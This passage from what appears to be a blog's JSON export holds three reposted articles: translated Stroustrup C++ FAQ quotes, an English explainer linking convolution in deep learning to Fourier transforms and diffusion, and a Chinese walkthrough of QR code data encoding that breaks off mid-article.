年，在尝试使用一个“功能强大”的电话受挫后，我说了这句话。我敢肯定这种心情并非为我独有，甚至这句话也可能并非我的原创；肯定有人在我之前就已经这么想了。 *“只有两种语言：一种被人抱怨，而另一种没人使用”。*是的。同样，我也非常怀疑这种心情是否为我独有。当然，必须持怀疑态度对待所有“只有两种……”的引证。 *“用类推来证明其实是欺骗行为”。*是的；TC++PL 第 692 页。优秀的类推是阐述观点的极好的途径，但很多时候，这些类推却没有可靠的论据，数据等。 *“自以为是的人总会让自知的人觉得厌烦”。*是的。 *“C++ 是我最钟爱的垃圾回收语言，因为它几乎不产生垃圾”。*是的；请参考为什么 C++ 没有垃圾回收机制？以及我如何处理内存泄漏。 *“如果你认为这很简单，那么你已经误解了这个问题”。*是的，但我不记得这句话是回答哪个问题的了。 “使用被视为很糟糕的语言开发出来的系统有很多，比那些用满载赞誉的美丽语言开发出来的系统要多得多。” 是的，在 MIT 技术回顾访谈中和别的地方。我同时也说了： “我认为我们应该从构建出来的应用程序中寻找优美之处，而不要在语言中寻找。”（我本应说“这胜于”，但却说了“而不要”） “为了用好 C++，必须熟悉设计及编程技巧。” “C++ 是被设计来表达构想的，但假若你心中无墨或者不知如何表达，那 C++ 也无能为力。” *很多时候，“计算机科学”是数学狂热的一种形式。*是的，但请不要忽略“很多时候”这个词。说这句话时的背景是：我正在担心人们对数据的关注不足（经验主义），而且对计算机科学和计算的连接也不够关注。这并非对“计算机科学可以是科学”这种观念的正面攻击（以 Knuth 的算法及算法分析为例；那就是一门科学，并且不属于任何其它科学）。呃，不，我不打算举具体的例子或名字。 *很多时候，“软件工程”既不是工程学也不涉及软件。*是的，但请不要忽略“很多时候”这个词。说这句话时的背景是：我正在担心人们对数据的关注不足（经验主义），而且对软件工程和代码的连接也不够关注。我担心必须交付有用的可维护代码这个事实可能会淹没于一系列步骤、共同标准和市场营销中；我也担心软件开发有时会受控于一些不能分辨代码好坏并以此为豪的人。呃，不，我不打算举具体的例子或名字。假若实践得当，软件开发会是一门有价值的工程学科，它会使工程原理推陈出新。 Antigloss 注：分割线前的译文乃叶丰翻译的，而其后的译文则是我翻译的。 原文地址：http://www.research.att.com/~bs/bs_faq.html#really-say-that","tags":"c++"},{"title":"Understanding Convolution in Deep Learning","url":"/20240806/understanding-convolution-in-deep-learning/","text":"转载自Understanding Convolution in Deep Learning Convolution is probably the most important concept in deep learning right now. It was convolution and convolutional nets that catapulted deep learning to the forefront of almost any machine learning task there is. But what makes convolution so powerful? How does it work? In this blog post I will explain convolution and relate it to other concepts that will help you to understand convolution thoroughly. There are already some blog post regarding convolution in deep learning, but I found all of them highly confusing with unnecessary mathematical details that do not further the understanding in any meaningful way. This blog post will also have many mathematical details, but I will approach them from a conceptual point of view where I represent the underlying mathematics with images everybody should be able to understand. The first part of this blog post is aimed at anybody who wants to understand the general concept of convolution and convolutional nets in deep learning. The second part of this blog post includes advanced concepts and is aimed to further and enhance the understanding of convolution for deep learning researchers and specialists. ※What is convolution? This whole blog post will build up to answer exactly this question, but it may be very helpful to first understand in which direction this is going, so what is convolution in rough terms? You can imagine convolution as the mixing of information. Imagine two buckets full of information which are poured into one single bucket and then mixed according to a specific rule. Each bucket of information has its own recipe, which describes how the information in one bucket mixes with the other. So convolution is an orderly procedure where two sources of information are intertwined. Convolution can also be described mathematically, in fact, it is a mathematical operation like addition, multiplication or a derivative, and while this operation is complex in itself, it can be very useful to simplify even more complex equations. Convolutions are heavily used in physics and engineering to simplify such complex equations and in the second part — after a short mathematical development of convolution — we will relate and integrate ideas between these fields of science and deep learning to gain a deeper understanding of convolution. But for now we will look at convolution from a practical perspective. ※How do we apply convolution to images? When we apply convolution to images, we apply it in two dimensions — that is the width and height of the image. We mix two buckets of information: The first bucket is the input image, which has a total of three matrices of pixels — one matrix each for the red, blue and green color channels; a pixel consists of an integer value between 0 and 255 in each color channel. The second bucket is the convolution kernel, a single matrix of floating point numbers where the pattern and the size of the numbers can be thought of as a recipe for how to intertwine the input image with the kernel in the convolution operation. The output of the kernel is the altered image which is often called a feature map in deep learning. There will be one feature map for every color channel. Convolution of an image with an edge detector convolution kernel. Sources: 1 2 We now perform the actual intertwining of these two pieces of information through convolution. One way to apply convolution is to take an image patch from the input image of the size of the kernel — here we have a 100×100 image, and a 3×3 kernel, so we would take 3×3 patches — and then do an element wise multiplication with the image patch and convolution kernel. The sum of this multiplication then results in one pixel of the feature map. After one pixel of the feature map has been computed, the center of the image patch extractor slides one pixel into another direction, and repeats this computation. The computation ends when all pixels of the feature map have been computed this way. This procedure is illustrated for one image patch in the following gif. Convolution operation for one pixel of the resulting feature map: One image patch (red) of the original image (RAM) is multiplied by the kernel, and its sum is written to the feature map pixel (Buffer RAM). Gif by Glen Williamson who runs a website that features many technical gifs. As you can see there is also a normalization procedure where the output value is normalized by the size of the kernel (9); this is to ensure that the total intensity of the picture and the feature map stays the same. ※Why is convolution of images useful in machine learning? There can be a lot of distracting information in images that is not relevant to what we are trying to achieve. A good example of this is a project I did together with Jannek Thomas in the Burda Bootcamp. The Burda Bootcamp is a rapid prototyping lab where students work in a hackathon-style environment to create technologically risky products in very short intervals. Together with my 9 colleagues, we created 11 products in 2 months. In one project I wanted to build a fashion image search with deep autoencoders: You upload an image of a fashion item and the autoencoder should find images that contain clothes with similar style. Now if you want to differentiate between styles of clothes, the colors of the clothes will not be that useful for doing that; also minute details like emblems of the brand will be rather unimportant. What is most important is probably the shape of the clothes. Generally, the shape of a blouse is very different from the shape of a shirt, jacket, or trouser. So if we could filter the unnecessary information out of images then our algorithm will not be distracted by the unnecessary details like color and branded emblems. We can achieve this easily by convoluting images with kernels. My colleague Jannek Thomas preprocessed the data and applied a Sobel edge detector (similar to the kernel above) to filter everything out of the image except the outlines of the shape of an object — this is why the application of convolution is often called filtering, and the kernels are often called filters (a more exact definition of this filtering processes will follow below). The resulting feature map from the edge detector kernel will be very helpful if you want to differentiate between different types of clothes, because only relevant shape information remains. Sobel filtered inputs to and results from the trained autoencoder: The top-left image is the search query and the other images are the results which have an autoencoder code that is most similar to the search query as measured by cosine similarity. You see that the autoencoder really just looks at the shape of the search query and not its color. However, you can also see that this procedure does not work well for images of people wearing clothes (5th column) and that it is sensitive to the shapes of clothes hangers (4th column). We can take this a step further: There are dozens of different kernels which produce many different feature maps, e.g. which sharpen the image (more details), or which blur the image (less details), and each feature map may help our algorithm to do better on its task (details, like 3 instead of 2 buttons on your jacket might be important). Using this kind of procedure — taking inputs, transforming inputs and feeding the transformed inputs to an algorithm — is called feature engineering. Feature engineering is very difficult, and there are little resources which help you to learn this skill. In consequence, there are very few people which can apply feature engineering skillfully to a wide range of tasks. Feature engineering is — hands down — the most important skill to score well in Kaggle competitions. Feature engineering is so difficult because for each type of data and each type of problem, different features do well: Knowledge of feature engineering for image tasks will be quite useless for time series data; and even if we have two similar image tasks, it will not be easy to engineer good features because the objects in the images also determine what will work and what will not. It takes a lot of experience to get all of this right. So feature engineering is very difficult and you have to start from scratch for each new task in order to do well. But when we look at images, might it be possible to automatically find the kernels which are most suitable for a task? ※Enter convolutional nets Convolutional nets do exactly this. Instead of having fixed numbers in our kernel, we assign parameters to these kernels which will be trained on the data. As we train our convolutional net, the kernel will get better and better at filtering a given image (or a given feature map) for relevant information. This process is automatic and is called feature learning. Feature learning automatically generalizes to each new task: We just need to simply train our network to find new filters which are relevant for the new task. This is what makes convolutional nets so powerful — no difficulties with feature engineering! Usually we do not learn a single kernel in convolutional nets, instead we learn a hierarchy of multiple kernels at the same time. For example a 32x16x16 kernel applied to a 256×256 image would produce 32 feature maps of size 241×241 (this is the standard size, the size may vary from implementation to implementation; ). So automatically we learn 32 new features that have relevant information for our task in them. These feature then provide the inputs for the next kernel which filters the inputs again. Once we learned our hierarchical features, we simply pass them to a fully connected, simple neural network that combines them in order to classify the input image into classes. That is nearly all that there is to know about convolutional nets at a conceptual level (pooling procedures are important too, but that would be another blog post). ※Part II: Advanced concepts We now have a very good intuition of what convolution is, and what is going on in convolutional nets, and why convolutional nets are so powerful. But we can dig deeper to understand what is really going on within a convolution operation. In doing so, we will see that the original interpretation of computing a convolution is rather cumbersome and we can develop more sophisticated interpretations which will help us to think about convolutions much more broadly so that we can apply them on many different data. To achieve this deeper understanding the first step is to understand the convolution theorem. ※The convolution theorem To develop the concept of convolution further, we make use of the convolution theorem, which relates convolution in the time/space domain — where convolution features an unwieldy integral or sum — to a mere element wise multiplication in the frequency/Fourier domain. This theorem is very powerful and is widely applied in many sciences. The convolution theorem is also one of the reasons why the fast Fourier transform (FFT) algorithm is thought by some to be one of the most important algorithms of the 20th century. The first equation is the one dimensional continuous convolution theorem of two general continuous functions; the second equation is the 2D discrete convolution theorem for discrete image data. Here denotes a convolution operation, denotes the Fourier transform, the inverse Fourier transform, and is a normalization constant. Note that “discrete” here means that our data consists of a countable number of variables (pixels); and 1D means that our variables can be laid out in one dimension in a meaningful way, e.g. time is one dimensional (one second after the other), images are two dimensional (pixels have rows and columns), videos are three dimensional (pixels have rows and columns, and images come one after another). To get a better understanding what happens in the convolution theorem we will now look at the interpretation of Fourier transforms with respect to digital image processing. ※Fast Fourier transforms The fast Fourier transform is an algorithm that transforms data from the space/time domain into the frequency or Fourier domain. The Fourier transform describes the original function in a sum of wave-like cosine and sine terms. It is important to note, that the Fourier transform is generally complex valued, which means that a real value is transformed into a complex value with a real and imaginary part. Usually the imaginary part is only important for certain operations and to transform the frequencies back into the space/time domain and will be largely ignored in this blog post. Below you can see a visualization how a signal (a function of information often with a time parameter, often periodic) is transformed by a Fourier transform. Transformation of the time domain (red) into the frequency domain (blue). Source You may be unaware of this, but it might well be that you see Fourier transformed values on a daily basis: If the red signal is a song then the blue values might be the equalizer bars displayed by your mp3 player. ※The Fourier domain for images Images by Fisher &amp; Koryllos (1998). Bob Fisher also runs an excellent website about Fourier transforms and image processing in general. How can we imagine frequencies for images? Imagine a piece of paper with one of the two patterns from above on it. Now imagine a wave traveling from one edge of the paper to the other where the wave pierces through the paper at each stripe of a certain color and hovers over the other. Such waves pierce the black and white parts in specific intervals, for example, every two pixels — this represents the frequency. In the Fourier transform lower frequencies are closer to the center and higher frequencies are at the edges (the maximum frequency for an image is at the very edge). The location of Fourier transform values with high intensity (white in the images) are ordered according to the direction of the greatest change in intensity in the original image. This is very apparent from the next image and its log Fourier transforms (applying the log to the real values decreases the differences in pixel intensity in the image — we see information more easily this way). Images by Fisher &amp; Koryllos (1998). Source We immediately see that a Fourier transform contains a lot of information about the orientation of an object in an image. If an object is turned by, say, 37% degrees, it is difficult to tell that from the original pixel information, but very clear from the Fourier transformed values. This is an important insight: Due to the convolution theorem, we can imagine that convolutional nets operate on images in the Fourier domain and from the images above we now know that images in that domain contain a lot of information about orientation. Thus convolutional nets should be better than traditional algorithms when it comes to rotated images and this is indeed the case (although convolutional nets are still very bad at this when we compare them to human vision). ※Frequency filtering and convolution The reason why the convolution operation is often described as a filtering operation, and why convolution kernels are often named filters will be apparent from the next example, which is very close to convolution. Images by Fisher &amp; Koryllos (1998). Source If we transform the original image with a Fourier transform and then multiply it by a circle padded by zeros (zeros=black) in the Fourier domain, we filter out all high frequency values (they will be set to zero, due to the zero padded values). Note that the filtered image still has the same striped pattern, but its quality is much worse now — this is how jpeg compression works (although a different but similar transform is used), we transform the image, keep only certain frequencies and transform back to the spatial image domain; the compression ratio would be the size of the black area to the size of the circle in this example. If we now imagine that the circle is a convolution kernel, then we have fully fledged convolution — just as in convolutional nets. There are still many tricks to speed up and stabilize the computation of convolutions with Fourier transforms, but this is the basic principle how it is done. Now that we have established the meaning of the convolution theorem and Fourier transforms, we can now apply this understanding to different fields in science and enhance our interpretation of convolution in deep learning. ※Insights from fluid mechanics Fluid mechanics concerns itself with the creation of differential equation models for flows of fluids like air and water (air flows around an airplane; water flows around suspended parts of a bridge). Fourier transforms not only simplify convolution, but also differentiation, and this is why Fourier transforms are widely used in the field of fluid mechanics, or any field with differential equations for that matter. Sometimes the only way to find an analytic solution to a fluid flow problem is to simplify a partial differential equation with a Fourier transform. In this process we can sometimes rewrite the solution of such a partial differential equation in terms of a convolution of two functions which then allows for very easy interpretation of the solution. This is the case for the diffusion equation in one dimension, and for some two dimensional diffusion processes for functions in cylindrical or spherical polar coordinates. ※Diffusion You can mix two fluids (milk and coffee) by moving the fluid with an outside force (mixing with a spoon) — this is called convection and is usually very fast. But you could also wait and the two fluids would mix themselves on their own (if it is chemically possible) — this is called diffusion and is usually a very slow when compared to convection. Imagine an aquarium that is split into two by a thin, removable barrier where one side of the aquarium is filled with salt water, and the other side with fresh water. If you now remove the thin barrier carefully, the two fluids will mix together until the whole aquarium has the same concentration of salt everywhere. This process is more “violent” the greater the difference in saltiness between the fresh water and salt water. Now imagine you have a square aquarium with 256×256 thin barriers that separate 256×256 cubes each with different salt concentration. If you remove the barrier now, there will be little mixing between two cubes with little difference in salt concentration, but rapid mixing between two cubes with very different salt concentrations. Now imagine that the 256×256 grid is an image, the cubes are pixels, and the salt concentration is the intensity of each pixel. Instead of diffusion of salt concentrations we now have diffusion of pixel information. It turns out, this is exactly one part of the convolution for the diffusion equation solution: One part is simply the initial concentrations of a certain fluid in a certain area — or in image terms — the initial image with its initial pixel intensities. To complete the interpretation of convolution as a diffusion process we need to interpret the second part of the solution to the diffusion equation: The propagator. ※Interpreting the propagator The propagator is a probability density function, which denotes into which direction fluid particles diffuse over time. The problem here is that we do not have a probability function in deep learning, but a convolution kernel — how can we unify these concepts? We can apply a normalization that turns the convolution kernel into a probability density function. This is just like computing the softmax for output values in a classification tasks. Here the softmax normalization for the edge detector kernel from the first example above. Softmax of an edge detector: To calculate the softmax normalization, we taking each value of the kernel and apply . After that we divide by the sum of all . Please note that this technique to calculate the softmax will be fine for most convolution kernels, but for more complex data the computation is a bit different to ensure numerical stability (floating point computation is inherently unstable for very large and very small values and you have to carefully navigate around troubles in this case). Now we have a full interpretation of convolution on images in terms of diffusion. We can imagine the operation of convolution as a two part diffusion process: Firstly, there is strong diffusion where pixel intensities change (from black to white, or from yellow to blue, etc.) and secondly, the diffusion process in an area is regulated by the probability distribution of the convolution kernel. That means that each pixel in the kernel area, diffuses into another position within the kernel according to the kernel probability density. For the edge detector above almost all information in the surrounding area will concentrate in a single space (this is unnatural for diffusion in fluids, but this interpretation is mathematically correct). For example all pixels that are under the 0.0001 values, will very likely flow into the center pixel and accumulate there. The final concentration will be largest where the largest differences between neighboring pixels are, because here the diffusion process is most marked. In turn, the greatest differences in neighboring pixels is there, where the edges between different objects are, so this explains why the kernel above is an edge detector. So there we have it: Convolution as diffusion of information. We can apply this interpretation directly on other kernels. Sometimes we have to apply a softmax normalization for interpretation, but generally the numbers in itself say a lot about what will happen. Take the following kernel for example. Can you now interpret what that kernel is doing? Click here to find the solution (there is a link back to this position). ※Wait, there is something fishy here How come that we have deterministic behavior if we have a convolution kernel with probabilities? We have to interpret that single particles diffuse according to the probability distribution of the kernel, according to the propagator, don’t we? Yes, this is indeed true. However, if you take a tiny piece of fluid, say a tiny drop of water, you still have millions of water molecules in that tiny drop of water, and while a single molecule behaves stochastically according to the probability distribution of the propagator, a whole bunch of molecules have quasi deterministic behavior —this is an important interpretation from statistical mechanics and thus also for diffusion in fluid mechanics. We can interpret the probabilities of the propagator as the average distribution of information or pixel intensities; Thus our interpretation is correct from a viewpoint of fluid mechanics. However, there is also a valid stochastic interpretation for convolution. ※Insights from quantum mechanics The propagator is an important concept in quantum mechanics. In quantum mechanics a particle can be in a superposition where it has two or more properties which usually exclude themselves in our empirical world: For example, in quantum mechanics a particle can be at two places at the same time — that is a single object in two places. However, when you measure the state of the particle — for example where the particle is right now — it will be either at one place or the other. In other terms, you destroy the superposition state by observation of the particle. The propagator then describes the probability distribution where you can expect the particle to be. So after measurement a particle might be — according to the probability distribution of the propagator — with 30% probability in place A and 70% probability in place B. If we have entangled particles (spooky action at a distance), a few particles can hold hundreds or even millions of different states at the same time — this is the power promised by quantum computers. So if we use this interpretation for deep learning, we can think that the pixels in an image are in a superposition state, so that in each image patch, each pixel is in 9 positions at the same time (if our kernel is 3×3). Once we apply the convolution we make a measurement and the superposition of each pixel collapses into a single position as described by the probability distribution of the convolution kernel, or in other words: For each pixel, we choose one pixel of the 9 pixels at random (with the probability of the kernel) and the resulting pixel is the average of all these pixels. For this interpretation to be true, this needs to be a true stochastic process, which means, the same image and the same kernel will generally yield different results. This interpretation does not relate one to one to convolution but it might give you ideas how to the apply convolution in stochastic ways or how to develop quantum algorithms for convolutional nets. A quantum algorithm would be able to calculate all possible combinations described by the kernel with one computation and in linear time/qubits with respect to the size of image and kernel. ※Insights from probability theory Convolution is closely related to cross-correlation. Cross-correlation is an operation which takes a small piece of information (a few seconds of a song) to filter a large piece of information (the whole song) for similarity (similar techniques are used on youtube to automatically tag videos for copyrights infringements). Relation between cross-correlation and convolution: Here denotes cross correlation and denotes the complex conjugate of . While cross correlation seems unwieldy, there is a trick with which we can easily relate it to convolution in deep learning: For images we can simply turn the search image upside down to perform cross-correlation through convolution. When we perform convolution of an image of a person with an upside image of a face, then the result will be an image with one or multiple bright pixels at the location where the face was matched with the person. Cross-correlation via convolution: The input and kernel are padded with zeros and the kernel is rotated by 180 degrees. The white spot marks the area with the strongest pixel-wise correlation between image and kernel. Note that the output image is in the spatial domain, the inverse Fourier transform was already applied. Images taken from Steven Smith’s excellent free online book about digital signal processing. This example also illustrates padding with zeros to stabilize the Fourier transform and this is required in many version of Fourier transforms. There are versions which require different padding schemes: Some implementation warp the kernel around itself and require only padding for the kernel, and yet other implementations perform divide-and-conquer steps and require no padding at all. I will not expand on this; the literature on Fourier transforms is vast and there are many tricks to be learned to make it run better — especially for images. At lower levels, convolutional nets will not perform cross correlation, because we know that they perform edge detection in the very first convolutional layers. But in later layers, where more abstract features are generated, it is possible that a convolutional net learns to perform cross-correlation by convolution. It is imaginable that the bright pixels from the cross-correlation will be redirected to units which detect faces (the Google brain project has some units in its architecture which are dedicated to faces, cats etc.; maybe cross correlation plays a role here?). ※Insights from statistics What is the difference between statistical models and machine learning models? Statistical models often concentrate on very few variables which can be easily interpreted. Statistical models are built to answer questions: Is drug A better than drug B? Machine learning models are about predictive performance: Drug A increases successful outcomes by 17.83% with respect to drug B for people with age X, but 22.34% for people with age Y. Machine learning models are often much more powerful for prediction than statistical models, but they are not reliable. Statistical models are important to reach accurate and reliable conclusions: Even when drug A is 17.83% better than drug B, we do not know if this might be due to chance or not; we need statistical models to determine this. Two important statistical models for time series data are the weighted moving average and the autoregressive models which can be combined into the ARIMA model (autoregressive integrated moving average model). ARIMA models are rather weak when compared to models like long short-term recurrent neural networks, but ARIMA models are extremely robust when you have low dimensional data (1-5 dimensions). Although their interpretation is often effortful, ARIMA models are not a blackbox like deep learning algorithms and this is a great advantage if you need very reliable models. It turns out that we can rewrite these models as convolutions and thus we can show that convolutions in deep learning can be interpreted as functions which produce local ARIMA features which are then passed to the next layer. This idea however, does not overlap fully, and so we must be cautious and see when we really can apply this idea. Here is a constant function which takes the kernel as parameter; white noise is data with mean zero, a standard deviation of one, and each variable is uncorrelated with respect to the other variables. When we pre-process data we make it often very similar to white noise: We often center it around zero and set the variance/standard deviation to one. Creating uncorrelated variables is less often used because it is computationally intensive, however, conceptually it is straight forward: We reorient the axes along the eigenvectors of the data. Decorrelation by reorientation along eigenvectors: The eigenvectors of this data are represented by the arrows. If we want to decorrelate the data, we reorient the axes to have the same direction as the eigenvectors. This technique is also used in PCA, where the dimensions with the least variance (shortest eigenvectors) are dropped after reorientation. Now, if we take to be the bias, then we have an expression that is very similar to a convolution in deep learning. So the outputs from a convolutional layer can be interpreted as outputs from an autoregressive model if we pre-process the data to be white noise. The interpretation of the weighted moving average is simple: It is just standard convolution on some data (input) with a certain weight (kernel). This interpretation becomes clearer when we look at the Gaussian smoothing kernel at the end of the page. The Gaussian smoothing kernel can be interpreted as a weighted average of the pixels in each pixel’s neighborhood, or in other words, the pixels are averaged in their neighborhood (pixels “blend in”, edges are smoothed). While a single kernel cannot create both, autoregressive and weighted moving average features, we usually have multiple kernels and in combination all these kernels might contain some features which are like a weighted moving average model and some which are like an autoregressive model. ※Conclusion In this blog post we have seen what convolution is all about and why it is so powerful in deep learning. The interpretation of image patches is easy to understand and easy to compute but it has many conceptual limitations. We developed convolutions by Fourier transforms and saw that Fourier transforms contain a lot of information about orientation of an image. With the powerful convolution theorem we then developed an interpretation of convolution as the diffusion of information across pixels. We then extended the concept of the propagator in the view of quantum mechanics to receive a stochastic interpretation of the usually deterministic process. We showed that cross-correlation is very similar to convolution and that the performance of convolutional nets may depend on the correlation between feature maps which is induced through convolution. Finally, we finished with relating convolution to autoregressive and moving average models. Personally, I found it very interesting to work on this blog post. I felt for long time that my undergraduate studies in mathematics and statistics were wasted somehow, because they were so unpractical (even though I study applied math). But later — like an emergent property — all these thoughts linked together and practically useful understanding emerged. I think this is a great example why one should be patient and carefully study all university courses — even if they seem useless at first. Solution to the quiz above: The information diffuses nearly equally among all pixels; and this process will be stronger for neighboring pixels that differ more. This means that sharp edges will be smoothed out and information that is in one pixel, will diffuse and mix slightly with surrounding pixels. This kernel is known as a Gaussian blur or as Gaussian smoothing. Continue reading. Sources: 1 2 Image source reference R. B. Fisher, K. Koryllos, “Interactive Textbooks; Embedding Image Processing Operator Demonstrations in Text”, Int. J. of Pattern Recognition and Artificial Intelligence, Vol 12, No 8, pp 1095-1123, 1998.","tags":"deep-learning"},{"title":"二维码的生成细节和原理","url":"/20240806/er-wei-ma-de-sheng-cheng-xi-jie-he-yuan-li/","text":"转载自二维码的生成细节和原理 二维码又称QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型：比如：字符，数字，日文，中文等等。这两天学习了一下二维码图片生成的相关细节，觉得这个玩意就是一个密码算法，在此写一这篇文章 ，揭露一下。供好学的人一同学习之。 关于QR Code Specification，可参看这个PDF：http://raidenii.net/files/datasheets/misc/qr_code.pdf 基础知识 定位图案 功能性数据 数据码和纠错码 数据编码 示例一：数字编码 示例二：字符编码 结束符和补齐符 按8bits重排 补齐码（Padding Bytes） 纠错码 最终编码 穿插放置 Remainder Bits 画二维码图 Position Detection Pattern Alignment Pattern Timing Pattern Format Information Version Information 数据和数据纠错码 掩码图案 ※基础知识 首先，我们先说一下二维码一共有40个尺寸。官方叫版本Version。Version 1是21 x 21的矩阵，Version 2是 25 x 25的矩阵，Version 3是29的尺寸，每增加一个version，就会增加4的尺寸，公式是：(V-1)*4 + 21（V是版本号） 最高Version 40，(40-1)*4+21 = 177，所以最高是177 x 177 的正方形。 下面我们看看一个二维码的样例： ※定位图案 Position Detection Pattern是定位图案，用于标记二维码的矩形大小。这三个定位图案有白边叫Separators for Postion Detection Patterns。之所以三个而不是四个意思就是三个就可以标识一个矩形了。 Timing Patterns也是用于定位的。原因是二维码有40种尺寸，尺寸过大了后需要有根标准线，不然扫描的时候可能会扫歪了。 Alignment Patterns 只有Version 2以上（包括Version2）的二维码需要这个东东，同样是为了定位用的。 ※功能性数据 Format Information 存在于所有的尺寸中，用于存放一些格式化数据的。 Version Information 在 &gt;= Version 7以上，需要预留两块3 x 6的区域存放一些版本信息。 ※数据码和纠错码 除了上述的那些地方，剩下的地方存放 Data Code 数据码 和 Error Correction Code 纠错码。 ※数据编码 我们先来说说数据编码。QR码支持如下的编码： Numeric mode 数字编码，从0到9。如果需要编码的数字的个数不是3的倍数，那么，最后剩下的1或2位数会被转成4或7bits，则其它的每3位数字会被编成 10，12，14bits，编成多长还要看二维码的尺寸（下面有一个表Table 3说明了这点） Alphanumeric mode 字符编码。包括 0-9，大写的A到Z（没有小写），以及符号$ % * + – . / : 包括空格。这些字符会映射成一个字符索引表。如下所示：（其中的SP是空格，Char是字符，Value是其索引值） 编码的过程是把字符两两分组，然后转成下表的45进制，然后转成11bits的二进制，如果最后有一个落单的，那就转成6bits的二进制。而编码模式和字符的个数需要根据不同的Version尺寸编成9, 11或13个二进制（如下表中Table 3） Byte mode, 字节编码，可以是0-255的ISO-8859-1字符。有些二维码的扫描器可以自动检测是否是UTF-8的编码。 Kanji mode 这是日文编码，也是双字节编码。同样，也可以用于中文编码。日文和汉字的编码会减去一个值。如：在0X8140 to 0X9FFC中的字符会减去8140，在0XE040到0XEBBF中的字符要减去0XC140，然后把结果前两个16进制位拿出来乘以0XC0，然后再加上后两个16进制位，最后转成13bit的编码。如下图示例： Extended Channel Interpretation (ECI) mode 主要用于特殊的字符集。并不是所有的扫描器都支持这种编码。 Structured Append mode 用于混合编码，也就是说，这个二维码中包含了多种编码格式。 FNC1 mode 这种编码方式主要是给一些特殊的工业或行业用的。比如GS1条形码之类的。 简单起见，后面三种不会在本文 中讨论。 下面两张表中， Table 2 是各个编码格式的“编号”，这个东西要写在Format Information中。注：中文是1101 Table 3 表示了，不同版本（尺寸）的二维码，对于，数字，字符，字节和Kanji模式下，对于单个编码的2进制的位数。（在二维码的规格说明书中，有各种各样的编码规范表，后面还会提到） 下面我们看几个示例， ※示例一：数字编码 在Version 1的尺寸下，纠错级别为H的情况下，编码： 01234567 1. 把上述数字分成三组: 012 345 67 2. 把他们转成二进制: 012 转成 0000001100； 345 转成 0101011001； 67 转成 1000011。 3. 把这三个二进制串起来: 0000001100 0101011001 1000011 4. 把数字的个数转成二进制 (version 1-H是10 bits ): 8个数字的二进制是 0000001000 5. 把数字编码的标志0001和第4步的编码加到前面: 0001 0000001000 0000001100 0101011001 1000011 ※示例二：字符编码 在Version 1的尺寸下，纠错级别为H的情况下，编码: AC-42 1. 从字符索引表中找到 AC-42 这五个字条的索引 (10,12,41,4,2) 2. 两两分组: (10,12) (41,4) (2) 3.把每一组转成11bits的二进制: (10,12) 10*45+12 等于 462 转成 00111001110 (41,4) 41*45+4 等于 1849 转成 11100111001 (2) 等于 2 转成 000010 4. 把这些二进制连接起来：00111001110 11100111001 000010 5. 把字符的个数转成二进制 (Version 1-H为9 bits ): 5个字符，5转成 000000101 6. 在头上加上编码标识 0010 和第5步的个数编码: 0010 000000101 00111001110 11100111001 000010 ※结束符和补齐符 假如我们有个HELLO WORLD的字符串要编码，根据上面的示例二，我们可以得到下面的编码， 编码 字符数 HELLO WORLD的编码 0010 000001011 01100001011 01111000110 10001011100 10110111000 10011010100 001101 我们还要加上结束符： 编码 字符数 HELLO WORLD的编码 结束 0010 000001011 01100001011 01111000110 10001011100 10110111000 10011010100 001101 0000 ※按8bits重排 如果所有的编码加起来不是8个倍数我们还要在后面加上足够的0，比如上面一共有78个bits，所以，我们还要加上2个0，然后按8个bits分好组： 00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 01000000 ※补齐码（Padding Bytes） 最后，如果如果还没有达到我们最大的bits数的限制，我们还要加一些补齐码（Padding Bytes），Padding Bytes就是重复下面的两个bytes：11101100 00010001 （这两个二进制转成十进制是236和17，我也不知道为什么，只知道Spec上是这么写的）关于每一个Version的每一种纠错级别的最大Bits限制，可以参看QR Code Spec的第28页到32页的Table-7一表。 假设我们需要编码的是Version 1的Q纠错级，那么，其最大需要104个bits，而我们上面只有80个bits，所以，还需要补24个bits，也就是需要3个Padding Bytes，我们就添加三个，于是得到下面的编码： 00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 01000000 11101100 00010001 11101100 上面的编码就是数据码了，叫Data Codewords，每一个8bits叫一个codeword，我们还要对这些数据码加上纠错信息。 ※纠错码 上面我们说到了一些纠错级别，Error Correction Code Level，二维码中有四种级别的纠错，这就是为什么二维码有残缺还能扫出来，也就是为什么有人在二维码的中心位置加入图标。 错误修正容量 L水平 M水平 Q水平 H水平 那么，QR是怎么对数据码加上纠错码的？首先，我们需要对数据码进行分组，也就是分成不同的Block，然后对各个Block进行纠错编码，对于如何分组，我们可以查看QR Code Spec的第33页到44页的Table-13到Table-22的定义表。注意最后两列： Number of Error Code Correction Blocks ：需要分多少个块。 Error Correction Code Per Blocks：每一个块中的code个数，所谓的code的个数，也就是有多少个8bits的字节。 举个例子：上述的Version 5 + Q纠错级：需要4个Blocks（2个Blocks为一组，共两组），头一组的两个Blocks中各15个bits数据 + 各 9个bits的纠错码（注：表中的codewords就是一个8bits的byte）（再注：最后一例中的（c, k, r ）的公式为：c = k + 2 * r，因为后脚注解释了：纠错码的容量小于纠错码的一半） 下图给一个5-Q的示例（因为二进制写起来会让表格太大，所以，我都用了十进制，我们可以看到每一块的纠错码有18个codewords，也就是18个8bits的二进制数） 组 块 数据 对每个块的纠错码 1 1 67 85 70 134 87 38 85 194 119 50 6 18 6 103 38 213 199 11 45 115 247 241 223 229 248 154 117 154 111 86 161 111 39 2 246 246 66 7 118 134 242 7 38 86 22 198 199 146 6 87 204 96 60 202 182 124 157 200 134 27 129 209 17 163 163 120 133 2 1 182 230 247 119 50 7 118 134 87 38 82 6 134 151 50 7 148 116 177 212 76 133 75 242 238 76 195 230 189 10 108 240 192 141 2 70 247 118 86 194 6 151 50 16 236 17 236 17 236 17 236 235 159 5 173 24 147 59 33 106 40 255 172 82 2 131 32 178 236 注：二维码的纠错码主要是通过Reed-Solomon error correction（里德-所罗门纠错算法）来实现的。对于这个算法，对于我来说是相当的复杂，里面有很多的数学计算，比如：多项式除法，把1-255的数映射成2的n次方（0&lt;=n&lt;=255）的伽罗瓦域Galois Field之类的神一样的东西，以及基于这些基础的纠错数学公式，因为我的数据基础差，对于我来说太过复杂，所以我一时半会儿还有点没搞明白，还在学习中，所以，我在这里就不展开说这些东西了。还请大家见谅了。（当然，如果有朋友很明白，也繁请教教我） ※最终编码 ※穿插放置 